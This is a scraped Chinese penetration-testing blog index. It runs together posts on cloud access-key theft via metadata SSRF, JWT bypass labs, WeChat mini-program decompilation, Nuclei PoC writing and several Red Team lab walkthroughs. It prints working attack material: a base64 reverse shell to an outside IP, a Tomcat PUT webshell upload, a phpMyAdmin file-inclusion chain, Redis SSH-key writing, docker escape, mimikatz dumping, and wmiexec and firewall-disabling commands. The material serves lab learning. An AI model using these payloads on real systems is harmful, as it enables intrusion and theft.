当你访问那个域名后会泄露本身的如alixx地址所以你知道可以地区域名接管 NMAP扫描 AKSK泄露接管 # AKSK不同厂商特征\n怎么得到AKSK：\r1：JS泄露\r2：APP反编译泄露\r3：拿到shell了翻文件\r4：源码泄露\rAk/SK特征识别：\r亚马逊云 (Amazon Web Services, AWS)的开头标识一般是\u0026#34;AKIA\u0026#34;\rGoogle云 Cloud Platform (GCP)的 开头标识一般是 \u0026#34;GOOG\u0026#34;\rMicrosoft Azure 的 Access Key 开头标识一般是 \u0026#34;AZ\u0026#34;\rIBM 云 (IBM Cloud) 的 Access Key 开头标识一般是 \u0026#34;IBM\u0026#34;\rOracle云 (Oracle Cloud) 的 Access Key 开头标识一般是 \u0026#34;OCID\u0026#34;\r腾讯云 (Tencent Cloud)的Access Key开头标识一般是 \u0026#34;AKID\u0026#34;\r阿里云 (Alibaba Cloud)的Access Key开头标识一般是 \u0026#34;LTAI\u0026#34;\r华为云 (Huawei Cloud)的 Access Key是20个随机大写字母和数字组成\r百度云 (Baidu Cloud) 的 Access Key开头标识一般是 \u0026#34;AK\u0026#34;\r京东云 (JD Cloud)的Access Key开头标识一般是 \u0026#34;JDC_\u0026#34;\r联通云 (China Unicom Cloud)的Access Key开头标识一般是 \u0026#34;LTC\u0026#34;\r移动云 (China Mobile Cloud)的Access Key开头标识一般是 \u0026#34;YD\u0026#34;\r中国电信云 (China Telecom Cloud)的开头标识一般是 \u0026#34;CTC\u0026#34;\r参考：https://wiki.teamssix.com/CloudService/more/ Ram用户权限-AKSK # RAM账号就是分配用户给他们用户可以用这个来登录阿里云，而这个用户有相应的AK和SK，不同用户权限由用户分配\r通过RAM控制台创建用户会生成对应的AKSK NMAP扫描 生成后记得复制不然看不了\nNMAP扫描 这里账号密码可以用户ram登录 AKSK用户调用\rhttps://signin.aliyun.com RAM用户登录网址\r使用工具云资产管理工具图形化界面\rhttps://github.com/wgpsec/lc\rhttps://github.com/wgpsec/cloudsword\rhttps://github.com/dark-kingA/cloudTools\rhttps://github.com/iiiusky/alicloud-tools\r这里我们输入AKSK但是还是不行因为用户也是有授权的 NMAP扫描 当你给了这些全部权限后\nNMAP扫描 成功识别当前账号的ECS 你可以点击接管会自动创建一个RAM用户进行点击RAM登录上去账户\nNMAP扫描 NMAP扫描 所以AKSK是要看运气的看权限的不然也没啥用\n根据AKSK权限区分控制OSS或者账号全部资产\n下面是官方工具需要AKSK登录\nNMAP扫描 云账户下面的AKSK # 可以看到我们用户下面本来就有AKSK\r云账号的AKSK默认就是绑定云账户，云账号什么权限他就是什么权限不需要额外设置 一种ram是下面分支而云账号的AKSK是他的载体 NMAP扫描 NMAP扫描 生成后它不需要设置什么权限-只要你账户有OSS他就可以看有ECS他就可以看，并且可以生成RAM用户\nECS-元数据 # 元数据 # 实例元数据是指实例ID、VPC信息、网卡信息等实例属性信息，支持在ECS实例内部通过访问元数据服务（Metadata Service）获取。 通过该获取方式，您无需登录控制台或调用API，在实例内部即可访问实例信息，可以更便捷、安全地配置或管理正在运行的实例或实例上的程序。\n阿里云元数据地址：http://100.100.100.200/ 腾讯云元数据地址：http://metadata.tencentyun.com/ 华为云元数据地址：http://169.254.169.254/ 亚马云元数据地址：http://169.254.169.254/ 微软云元数据地址：http://169.254.169.254/ 谷歌云元数据地址：http://metadata.google.internal/\n1、前提条件：\r-弹性计算配置访问控制角色\r-SSRF漏洞或已取得某云服务器权限（webshell或漏洞rce可以访问触发URL）\rRAM用户不同，RAM角色没有永久身份凭证（登录密码或访问密钥），需要被一个可信实体扮演 分配角色到ECS上面\r获取关键信息\rhttp://100.100.100.200/latest/meta-data/\rhttp://100.100.100.200/latest/meta-data/ram/security-credentials/ 获得用户\r获取临时凭证\rhttp://100.100.100.200/latest/meta-data/ram/security-credentials/xxxxxx 访问后获得AKSK以及TOKEN然后使用云管理工具连接\r利用条件：SSRF，或者得到SHELL\r所以条件下:横向移动\r1：你拿到权限里面是ROOT你可以直接访问对应有没有用户获得AKSK如果对方AKSK权限大进而扩大战果\r2：可以利用SSRF获得AKSK 基础利用 # 授予角色\nNMAP扫描 访问对应的元数据获得用户然后访问用户得到AKSK放入利用工具利用\nNMAP扫描 一旦收回就显示404了\nNMAP扫描 ","date":"14 August 2025","externalUrl":null,"permalink":"/posts/oss/","section":"Posts","summary":"","title":"云上服务-OSS存储桶渗透-AKSK两种利用特征","type":"posts"},{"content":"","date":"13 August 2025","externalUrl":null,"permalink":"/tags/jwt/","section":"Tags","summary":"","title":"Jwt","type":"tags"},{"content":" JWT渗透相关 # 介绍 # JSON Web Token(JWT)。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。这使得JWT成为高度分布式网站的热门选择，在这些网站中，用户需要与多个后端服务器无缝交互。\n分为三个部分组成\nHeader-payload-Signature(签名)\n工作流程：post提交表单后，后端验证完成生成一个jwt，接下来返回该jwt至客户端，随后请求中带上该jwt，即可工作。\n5、作为请求头可以跨域工作\n对比cookie-session\r1、JWT数据量小，传输速度快\r2、由于是json，JWT是跨语言的，应用广\r3、更适用于移动端，因为它们不支持cookie\r4、避免csrf，因为不依赖cookie\r头：\r{\r\u0026#34;alg\u0026#34;: \u0026#34;HS256\u0026#34;,\t#签名算法 HMAC SHA256\r\u0026#34;typ\u0026#34;: \u0026#34;JWT\u0026#34;\t#统一为JWT\r}\rpayload\r{\r\u0026#34;sub\u0026#34;: \u0026#34;1234567890\u0026#34;,\r\u0026#34;name\u0026#34;: \u0026#34;Helen\u0026#34;,\r\u0026#34;admin\u0026#34;: true\r}\rSignature（验证） 实验1-不验证签名 # Lab: JWT authentication bypass via unverified signature 不会验证签名 # https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature\n实现修改用户为admin\nNMAP扫描 在你登录上去后产生JWT里面对应了你的用户名信息\n放入到工具扫描可以得到\nNMAP扫描 为了我们修改可以使用JWTTOOL -T 修改 或者使用BP插件修改\nNMAP扫描 NMAP扫描 看看生成的用户修改没\nNMAP扫描 我们访问/admin重新发包\neyJraWQiOiJkOTE3NDA3My1lMTcwLTQ4NDctOTAwMC04ZTcxMzY1Yjg1YmUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NTA1NjQzMSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.pQxVLaYatgGTpT24U6fh5Le3WacEkOP5_x2KW-Rg6_sVClGmUfgq1CXxHfUjQyjSGnJBIuiSoAdBS7u0m9MMdgcEz-NNPtc6CPUOcDZ2_coG9IlMFRd1sC6QOvgBTglRC4vzVMySrixSEWGDyr9cXGFGR3WhFb38dtCRHKxSTPDTC33QeqvfCtYWDqkPoYzEJ4766II_3tEYB3sMHWlveWKPuiBq7P9jg-N2y3aaToNsM_rSg8733ev8BJtkoJzoPmXlE6dhoNvdwKALYZ0Gpa1r-TbjAY0cdREhjoSuhZWjp_RXok9ddex4DDZDZwjRoh-JebOvzIng_tIgIAbDbA NMAP扫描 成功进入管理员界面删除用户即可通过 删除也要覆盖JWT进行绕过因为他并没有验证签名\nNMAP扫描 实验2 对方验证不要签名的JWT # JWT authentication bypass via flawed signature verification # https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification\n目的也是删除用户登录admin网页\n这个设置缺陷是对方接收未签名的JWT就是alg为none\n这里-H 可以看到可以输入 -X a 直接让JWT签名为空不用手动输入了\nNMAP扫描 NMAP扫描 我们来发包验证\nNMAP扫描 可以看到成功进入\neyJraWQiOiJmZWIyMjFkOS00MWI0LTQwNGEtOGUyZi1lNjU4Mzk5YjM0MDAiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NTA1NzgxNCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9. NMAP扫描 实验3 签名弱口令 # JWT authentication bypass via weak signing key # https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key\n签名也是可以爆破的，如果你爆破出签名就可以随意利用前提是他的加密算法符合\n使用DudeSuite 工具爆破也可以使用john hashcat\n注意爆破要输入完整的JWT\n输入整个 JWT 可以确保爆破过程的完整性和准确性。有些情况下，JWT 的负载中可能包含一些与验证逻辑相关的信息（比如过期时间、用户角色等），虽然这些信息不是直接参与签名计算，但在某些场景下，它们会影响到签名验证的最终结果。通过使用完整的 JWT，工具可以模拟整个签名验证的过程，更准确地判断找到的密钥是否是正确的签名密钥 。\nNMAP扫描 拿到密钥是secret1\r可以直接到官网输入密钥修改了 但是前面两个实验是不可以直接修改的必须使用工具\rhttps://www.jwt.io/ NMAP扫描 发包验证成功删除即可通过\nNMAP扫描 ","date":"13 August 2025","externalUrl":null,"permalink":"/posts/jwt/","section":"Posts","summary":"","title":"JWT渗透相关","type":"posts"},{"content":"","date":"8 August 2025","externalUrl":null,"permalink":"/tags/git/","section":"Tags","summary":"","title":"Git","type":"tags"},{"content":"","date":"8 August 2025","externalUrl":null,"permalink":"/tags/totp/","section":"Tags","summary":"","title":"TOTP","type":"tags"},{"content":"","date":"8 August 2025","externalUrl":null,"permalink":"/tags/wechat/","section":"Tags","summary":"","title":"Wechat","type":"tags"},{"content":" Wechat渗透相关抓包反编译 # e0e1反编译工具 # 需要配置文件目录config.yaml里面\nwx-file: \u0026lsquo;C:\\Users\\user\\Documents\\WeChat Files\u0026rsquo; 配置你的目录\n自动收集接口这个工具更偏向信息收集\nNMAP扫描 生成对应的文件xlsx\nNMAP扫描 Wedecode反编译工具 # wedecode程序可以实现全面反编译对比e0e1但是e0e1是自动化实现 但是推荐两个一起用\nNMAP扫描 当你微信小程序访问点击一个进去后会生成一个文件夹\nwx开头的就可以使用工具进行反编译了这里注意微信版本太高好像不能反编译了没有wxapkg后缀了\nNMAP扫描 但是你放入进去它提示错误-先解密才行\nNMAP扫描 使用目录下的解密工具\nNMAP扫描 打开选中__APP__.wxapkg\nNMAP扫描 生成一个文件然后再去放到wedecode里面\nNMAP扫描 然后反编译\nNMAP扫描 NMAP扫描 微信小程序在线调试 # 这里要注意版本的\n任务管理器右键打开目录查看小程序版本\nNMAP扫描 JaveleyQAQ/WeChatOpenDevTools-Python: WeChatOpenDevTool 微信小程序强制开启开发者工具\nhttps://github.com/tom-snow/wechat-windows-versions/releases/download/v3.9.10.19/WeChatSetup-3.9.10.19.exe 推荐这个版本\nWechatOpenDevTools-Python.exe\n现在没有我们来开启它\n先关闭所以小程序\nNMAP扫描 NMAP扫描 NMAP扫描 BP抓包小程序 # Proxifier工具\nwechatappex.exe加到程序里面\nNMAP扫描 成功抓包\nNMAP扫描 # ","date":"8 August 2025","externalUrl":null,"permalink":"/posts/wechat/","section":"Posts","summary":"","title":"Wechat渗透相关抓包反编译","type":"posts"},{"content":"","date":"8 August 2025","externalUrl":null,"permalink":"/tags/wedocode/","section":"Tags","summary":"","title":"Wedocode","type":"tags"},{"content":" XuanJi靶机\u0026mdash;难度low知识点-Git,TOTP,so提权 # Nmap扫描发现端口开放 # 常规的端口\nNMAP扫描 结果是一个验证码令牌\nNMAP扫描 Dirsearch发现Git泄露用工具提取\nNMAP扫描 这个工具是PYTHON2\nNMAP扫描 git log -p找出不同点发现一个注释\nNMAP扫描 放在生成器网站base32 都可以\nTOTP 生成器\n在线OTP密码生成器\nNMAP扫描 拿到shell权限 # 反弹就行\nNMAP扫描 linpeas扫描发现有一个文件可写 AI说可以动态库提取提权\nNMAP扫描 拿root # 写一个C文件\nNMAP扫描 生成为动态库so文件\n-fPIC：生成位置无关代码（共享库必需）。 -shared：指定生成共享库。 NMAP扫描 输入后执行root他会调用然后获得root权限\n但是这里有问题再把情况返回试试\nNMAP扫描 NMAP扫描 可以执行命令\nNMAP扫描 总结一下 # ","date":"8 August 2025","externalUrl":null,"permalink":"/posts/xuanji/","section":"Posts","summary":"","title":"XuanJi靶机---难度low知识点-Git,TOTP","type":"posts"},{"content":" 红日靶场4\u0026mdash; # 一共三台主机 一台双网卡1公网和内网网段 还有两台一台DC 一台WIN7 内网网段为183\nGetshell # 发现公网开了3个奇怪端口我们访问\nNMAP扫描 2001端口getshell # 2001一看就是Struct2 直接工具getshell 第一个\u0026mdash;\u0026mdash;\u0026mdash;2001\nNMAP扫描 NMAP扫描 NMAP扫描 上传JSP哥斯拉getshell\nNMAP扫描 2002端口 # 没有管理界面\nNMAP扫描 https://www.exploit-db.com/exploits/42953 tomcat PUT CVE\rPUT /1.jsp/ HTTP/1.1\rHost: 192.168.3.103:8080\rUpgrade-Insecure-Requests: 1\rUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\rReferer: http://192.168.3.103:8080/examples/\rAccept-Encoding: gzip, deflate\rAccept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2\rCookie: JSESSIONID=A27674F21B3308B4D893205FD2E2BF94\rConnection: close\rContent-Length: 26\r\u0026lt;% out.println(\u0026#34;hello\u0026#34;);%\u0026gt; NMAP扫描 这里我们写入哥斯拉的shell连接\nNMAP扫描 2003端口 # NMAP扫描 里面右下角有admin版本4.8.1\nPOC利用\nphpmyadmin 4.8.1 远程文件包含漏洞 利用\rhttp://192.168.1.188:2003/index.php?target=db_datadict.php%253f/../../../../../../\retc/passwd\r我们可以包含\r执行 SELECT \u0026#39;\u0026lt;?php phpinfo();?\u0026gt;\u0026#39; 时，PHP 会把查询结果（即字符串 \u0026lt;?php phpinfo();?\u0026gt; ）通过 Session 机制存储（比如写入 $_SESSION 或直接落地到 Session 文件）。\r---Session 的本质是 “服务器存储用户数据的容器”，并非只能存 “登录信息” 。--\rselect \u0026#39;\u0026lt;?php phpinfo();?\u0026gt;\u0026#39; 这个session\r旧版本：sess_ + session_id\r新版本：可能直接用 session_id，但历史场景中大量存在 sess_ 前缀的习惯。\r通常在/tmp\rhttp://192.168.1.188:2003/index.php?target=db_datadict.php%253f/../../../../../../\rtmp/sess_6dd19ff2088d22ac4b1bfb67db1a68a5\rselect \u0026#39;\u0026lt;?php system(base64_decode(\u0026#34;YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMzIuNjQvODA4MCAwPiYxIg==\u0026#34;)) ?\u0026gt;\u0026#39; 反弹 看下session\nNMAP扫描 NMAP扫描 反弹shell\nNMAP扫描 docker提权 # tomcatshell里面发现了是在docker环境\nNMAP扫描 并且是特权 我们可以使用挂载逃逸\r把/dev/sda1 挂载过去 建立文件夹 niko下面\r写入公钥到root里面\r登录试试\r这里仅仅限制tomcat docker提权 其余两个shell没找到提权方法 NMAP扫描 这里我也试了定时任务但是就是不行\nNMAP扫描 并且可以看到确定是写入进去了的\nNMAP扫描 最后还是密钥登录拿到web全部权限\nNMAP扫描 内网渗透 # 启动我们的CS上线下第一台linux shell 这里用插件linux上线\rgenCrossC2.Linux ip tcp ./.cobaltstrike.beacon_keys null Linux x64 3.out NMAP扫描 生成开一个python3 对面用wget下载执行上线\nNMAP扫描 成功上线web\nNMAP扫描 发现另外一张网卡183 我们可以扫描下\nNMAP扫描 fsCAN扫描结果\nNMAP扫描 这里我用CS建立linux隧道没有成功换一个C2工具\nNMAP扫描 本地可以访问内网了使用ms17010扫描\nNMAP扫描 然后用msfconsle代理下socks扫描\nuse auxiliary/scanner/smb/smb_ms17_010\rset rhost 192.168.183.129\rsetg Proxies socks5:116.62.32.64:36666 NMAP扫描 拿下了win7\nNMAP扫描 使用mimikatz抓取密码开启3389登录上去\nNMAP扫描 然后使用MS14-068 注入但是我这里不知道为什么一直不成功\r命令如下生成后注入进去\r这里修改管理员密码\rnet user administrator Admin12345 net user administrator Admin12345 /active:yes 后激活rdp\rREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 打开3389 登录使用ms14-068\ncd \\Users\\douser\\Desktop\rMS14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.131 -p Dotest123\rmimikatz.exe\rkerberos::purge 清空\rkerberos::list\rkerberos::ptc TGT_douser@DEMO.com.ccache\rdir \\\\WIN-ENS2VR5TR3N\\C$\r然后可以访问DC C盘\r我这里能是建立了连接net use 如果你成功了注入了可以直接执行 下一步就是有了最高权限就是关闭防火墙这时候能用ms17010打DC了 NMAP扫描 ","date":"8 August 2025","externalUrl":null,"permalink":"/posts/red4/","section":"Posts","summary":"","title":"红日靶场4","type":"posts"},{"content":"","date":"6 August 2025","externalUrl":null,"permalink":"/tags/nuclei/","section":"Tags","summary":"","title":"Nuclei","type":"tags"},{"content":" nuclei-POC编写 # CVE介绍 # https://docs.nuclei.sh/template-guide/introduction https://blog.csdn.net/qq_41315957/article/details/126594572 https://blog.csdn.net/qq_41315957/article/details/126594670\nvulhub-启动CVE-2023-28432\nhttps://github.com/vulhub/vulhub/blob/master/minio/CVE-2023-28432/README.zh-cn.md\n集群启动后，访问http://your-ip:9001可以查看Web管理页面，访问http://your-ip:9000是API服务。\n正常POC\nPOST /minio/bootstrap/v1/verify HTTP/1.1\rHost: your-ip:9000\rAccept-Encoding: gzip, deflate\rAccept: */*\rAccept-Language: en-US;q=0.9,en;q=0.8\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36\rConnection: close\rCache-Control: max-age=0\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 0\r会得到两个key\r放入即可利用 下载完开启是自动开启的服务，你不使用可以手动控制关闭\n123 123 手动编写httppoc # copy一个官方的按照格式进行修改\r这里修改下id 注意这个serverity等级不要乱改 改了会报错就medium high 等固定格式的进行修改 123 nuclei.exe -t mini.yaml -validate 123 id: CVE-2023-28432-minio\rinfo:\rname: starrui777\rauthor: starrui777\rseverity: high\rtags: cnvd,cnvd2017,emobile,ognl,fanwei\rhttp:\r- raw:\r- |\rPOST /minio/bootstrap/v1/verify HTTP/1.1\rHost: {{Hostname}}\rAccept-Encoding: gzip, deflate\rAccept: */*\rAccept-Language: en-US;q=0.9,en;q=0.8\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36\rConnection: close\rCache-Control: max-age=0\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 0\rmatchers:\r- type: word\rpart: body\rwords:\r- \u0026#39;MINIO_ROOT_PASSWORD\u0026#39;\r- \u0026#39;MINIO_ROOT_USER\u0026#39;\rcondition: and\r基础解释：\rhttp: 表示http请求 {{Hostname}} 表示获取你输入的IP加端口\rraw 格式:完全模拟真实的 HTTP 报文，Nuclei 会原样发送请求，避免了因 YAML 语法转换可能导致的格式问题（比如 headers 缩进、特殊字符处理等）。\rmatchers: 表示匹配 word:返回词 包含两个 condition and表示两个都有表示漏洞验证成功否则失败\r还有很多见链接 这种什么缩进啊单词啊错误一个就识别不了可以使用validata识别或者AI问下但是AI大概率不行 123 手动编写-DNSLOGPOC # 首先DNSlog地址可长可短\rContent-Length: 165 这里就是确定不了数据包 你可以把\r​ Connection: close\r​ Content-Length: 165\r删除 可能删除 Content-Length，服务器可能无法正确判断请求体的结束位置\r它自带有dns不要直接放去 poc\rid: CVE-2022-30525\rinfo:\rname: starrui777\rauthor: starrui777\rseverity: high\rtags: cnvd,cnvd2017,emobile,ognl,fanwei\rhttp:\r- raw:\r- |\rPOST /ztp/cgi-bin/handler HTTP/1.1\rHost: {{Hostname}}\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\rContent-Type: application/json\rConnection: close\rContent-Length: 165\r{\u0026#34;command\u0026#34;: \u0026#34;setWanPortSt\u0026#34;,\u0026#34;proto\u0026#34;: \u0026#34;dhcp\u0026#34;,\u0026#34;port\u0026#34;: \u0026#34;1270\u0026#34;,\u0026#34;vlan_tagged\u0026#34;: \u0026#34;1270\u0026#34;,\u0026#34;vlanid\u0026#34;: \u0026#34;1270\u0026#34;,\u0026#34;mtu\u0026#34;: \u0026#34;{{payload1}}\u0026#34;,\u0026#34;data\u0026#34;:\u0026#34;\u0026#34;}\rpayloads:\rpayload1:\r- \u0026#34;; ping -c 3 {{interactsh-url}};\u0026#34;\rmatchers:\r- type: word\rpart: interactsh_protocol\rname: dns\rwords:\r- \u0026#34;dns\u0026#34;\r这里我用nuclei 2版本可以用nuclei3不行可能语法有变动 123 BP插件直接生成 # nuclei-burp-plugin-1.1.3\n常规的HTTP编写 dns的不行\n抓包记得修改端口\n123 选择响应匹配词发送到插件\n123 可以插件里面执行也可以保存下来\n123 自己验证\n123 ","date":"6 August 2025","externalUrl":null,"permalink":"/posts/nuclei-poc/","section":"Posts","summary":"","title":"nuclei-POC编写","type":"posts"},{"content":"","date":"4 August 2025","externalUrl":null,"permalink":"/tags/avws/","section":"Tags","summary":"","title":"AVWS","type":"tags"},{"content":" 自动化漏洞扫描工具-AVWS-POC管理工具-Nuclei-Tscanplus-Yscan # AVWS # 下载完开启是自动开启的服务，你不使用可以手动控制关闭\n123 登录后选择Target添加网址\n123 进入后默认选择扫描全部漏洞正常扫描\n123 如果你想BP看或者BP自动扫描可以转发数据包到BP联合\n123 选择扫描默认选择\n123 点进去查看信息\n123 选择扫描的漏洞提权发送包复制发送验证\n123 Tscanplus-集成工具 # 这个工具需要VIP看情况使用-附带指纹探测端口扫描等功能\n123 附带指纹识别很好用\n123 Yscan-集成工具 # 没有上面的VIP但是功能少点\n123 Nuclei-POC漏洞测试工具 # projectdiscovery/nuclei-templates: Community curated list of templates for the nuclei engine to find security vulnerabilities. 官方库\nhttps://github.com/ExpLangcn/NucleiTP https://github.com/wooluo/nuclei-templates-2025hw\nnuclei.exe -h帮助 -up更新 -t选择模板不选默认 -target 目标网址\n123 Yakit # yakit不仅可以控制发包也可以扫描漏洞\n123 全自动工具GOBY # 但是因为红队版POC少 使用需要付费 扫描默认扫描端口和POC 只需要IP\n123 ","date":"4 August 2025","externalUrl":null,"permalink":"/posts/scan/","section":"Posts","summary":"","title":"自动化漏洞扫描工具","type":"posts"},{"content":" APP-脱壳 # 要用到frida\npip install frida\rpip install frida-tools\rpip install frida-dexdump 脱壳\rfrida模拟器版本要和本地的一致\r转发并启动Frida\radb forward tcp:27042 tcp:27042\r连接判断：frida-ps -U frida-ps -R 确定上传的和本地的一致\n123 发现可以同步查看证明无误\n123 获取下APP包名字发现有加固\n123 在模拟器中先启动APP然后输入命令获取class文件\n123 压缩后上传到模拟器中\n123 解压缩\n123 全选DEX修复\n123 修复后放到压缩包里面发到主机\n123 解压放入jadx反编译APP软件\n123 发现可以搜索了，没有脱壳全是prop开头这种后缀\n123 ","date":"2 August 2025","externalUrl":null,"permalink":"/posts/app3/","section":"Posts","summary":"","title":"APP脱壳","type":"posts"},{"content":"","date":"2 August 2025","externalUrl":null,"permalink":"/tags/cs/","section":"Tags","summary":"","title":"CS","type":"tags"},{"content":" 红日靶场1-CS内网渗透 # 架构 # IP：\n攻击者为1网段\nweb服务器：1和52网段 其余成员皆只有1网段\n123 使用工具 # 密码可能不同因为进去这些服务器就让你改密码你可以修改后改回来\n使用工具：\nCS4.7\n哥斯拉\nimpacket-0.11.0套件\n开始渗透 # 第一台主机 # 这里shell有两种还有一种是网站的还有一种是下面这种数据库\n123 dir扫描发现开了phpadmin登录看看\n123 弱口令进去\nroot:root 123 https://www.cnblogs.com/hellobao/articles/17253635.html\nphpadmin提取方法\r我选择下面这种\rMySQL 本身具备的特性\r通过日志文件写 shell\rSHOW VARIABLES LIKE \u0026#39;general%\u0026#39;;\rset global general_log = \u0026#34;ON\u0026#34;;\rset global general_log_file=\u0026#39;C:\\\\phpstudy\\\\www\\\\\\\\star.php\u0026#39;\r因为他这是phpstudy所以写入日志到star.php 打开功能\n123 命令执行无误\n123 确实可以访问\n123 写入到日志\n123 哥斯拉连接\n123 弹到我们的CS工具上\n123 扫描端口网段\n123 自动放入到密码和目标里面\n123 找到CD主机\n123 123 123 第二台主机 # 因为前面信息收集到都开放了445 我们尝试下永恒之蓝和wmi\n123 不行啊两台都\n123 使用套件里面的wmi成功拿下DC\npython wmiexec.py Administrator:hongrisec@2025@192.168.52.138 -codec gbk 123 这里我试了反弹但是就是不行正向都不行\n123 最后关闭防火墙可以连接\n#关闭防火墙\rnetsh firewall set opmode disable #winsows server 2003 之前\rnetsh advfirewall set allprofiles state off #winsows server 2003 之后\r#注册表开启3389端口\rREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\r#添加防火墙规则\rnetsh advfirewall firewall add rule name=\u0026#34;Open 3389\u0026#34; dir=in action=allow protocol=TCP localport=3389 123 第三台主机 # 在密码凭证那里\n后面我们横向连接密码喷射上到第3台\n123 三台全部拿下\n123 ","date":"31 July 2025","externalUrl":null,"permalink":"/posts/red1/","section":"Posts","summary":"","title":"红日靶场1-CS内网渗透","type":"posts"},{"content":"","date":"29 July 2025","externalUrl":null,"permalink":"/tags/ms-17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9Dsmb/","section":"Tags","summary":"","title":"Ms-17-010永恒之蓝smb","type":"tags"},{"content":"","date":"29 July 2025","externalUrl":null,"permalink":"/tags/vshell/","section":"Tags","summary":"","title":"Vshell","type":"tags"},{"content":"","date":"29 July 2025","externalUrl":null,"permalink":"/tags/%E5%86%85%E7%BD%91/","section":"Tags","summary":"","title":"内网","type":"tags"},{"content":" 红日靶场7-WP-MS17-010-WMI-laravel-docker-exp # 架构如下记得关闭win7防火墙\n123 工具\nfscan\nCVE-2021-3129.py\nredis-cli or Another Redis Desktop Manager\nC2平台用于socks代理\nlinux内核提权C脚本 CVE-2021-3493/exploit.c at main · briskets/CVE-2021-3493\nProxifier代理\nmimikatz 密码\nimpacket-0.11.0-wmiexec 工具\n方程式工具包图形界面版V0.42\n第一台主机 # 使用FSCAN扫描是laravel框架使用CVE\n123 123 拿下一个后门\n同时他这里扫描还有一个redis我们试试未授权发现可以写入我们的公钥进去 直接SSH访问拿下第一台主机shell\n这里set read-only no是让他可写\nconfig set dir /root/.ssh/\rconfig set dbfilename authorized_keys\r# 保存key的时候加上两个`\\n`是为了避免和Redis里其他缓存数据混合\rconfig set slave-read-only no\rset key \u0026#34;\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChJ31EeTjZIw5tz/8b2Ma6XyrjI6+FSUfbnWRF7HA6/pMtgTbZGPhKXRzdigHq2NY40KSz7xpeDvpZEbdCjpCiimXfwgALaZpI/GxftyA4C9yWoSQxR7jdK8dWAurA9rnoPnwrOO8F14rg2P2vknrtR70eIklAwbuDvJ8Aq9Ai5tMPaiOx2uJAYRWYRgOd/jP4WhZ8nF88N+E963xFf/Bf37AMV4SVujvasubsmM96t7fOqEBgzyK+xTClVqhzzGKhcr5AfYDvemDnffXEC3Ff+cdkXpW8HhX8FrK6D2HzwpOIN/8hypJNkGssXOZ9E4rTWWoY84VtPvceYMUI7xV44VskmZMLYrBAxfPDzEJV/HHKX1xQXwsHg7WiSRntApPS3BfeMr8ZqJTSBqoTVAnoMAuClPy1Vm1c+mlzvjlCbBBLfLEWNvuslzR9rQMFpMwLN3PoBhyGZ5+gv94QPbicLhNuLdU10KD5dHLtWUoWIGOu2RqtcjjKul+fT62BPy8= root@kali\\n\\n\u0026#34;\rsave 123 登录成功\n123 可以看它使用了nginx代理了内网的52.20的8000端口也就是说这个端口有这个服务\n123 我们把上面那个shell弹过来因为是内网可以弹\n123 可以发现我们是在docker中\n123 这里root有一个权限\n123 经典环境变量劫持提权\n123 123 第二台主机 # 挂载逃逸\n123 可以发现我们现在的目录就是在docker外这是源自于他设置docker设置了我们可以挂载并且修改后同步到上面不然不行\n123 我们写入公钥到ubuntu用户\n123 123 123 支持拿下两台主机\n123 linux内核提权\n123 第三台主机-OAweb2 # 我们在主机二上面放fscan\n发现了内网有一个OA系统\n123 我们在第一台DMZ主机加socks这里C2平台你用MSF CS都可以\n123 windows使用Proxifier代理\n123 123 访问时候代理触发证明配置正确\n123 使用OA工具扫描获得一个SHELL\n123 蚁剑连接\n123 放入后门我们连接\n123 我们正向socks连接获得三台主机权限\n123 第四台主机 # 这里我环境很多问题IP第一台变了181变了184\n我们上传mimikatz用户黄金票据扫描密码\n123 mimikatz.x64.exe \u0026#34;sekurlsa::logonpasswords full\u0026#34; exit \u0026gt; password.txt 123 123 这里我们在windows上面加一个socks代理 创建一个socks池用户全面穿透内网到达92网段\n123 使用wmiexec协议获取DC\n123 远程下载OA上面的8067后门我们可以主动连接\n123 拿下第四台\n123 第五台 # FSCAN扫描\n123 发现了永恒之蓝\n123 工具\n123 123 123 远程下载后门正面连接拿下第五台\n123 关闭防火墙\rnet use \\\\192.168.93.30\\ipc$ \u0026#34;Whoami2021\u0026#34; /user:\u0026#34;Administrator\u0026#34;\rsc \\\\192.168.93.30 create unablefirewall binpath= \u0026#34;netsh advfirewall set allprofiles state off\u0026#34;\rsc \\\\192.168.93.30 start unablefirewall ","date":"29 July 2025","externalUrl":null,"permalink":"/posts/red7/","section":"Posts","summary":"","title":"红日靶场7-WP-MS17-010-WMI-laravel-docker-exp","type":"posts"},{"content":" APP-动态调试 # 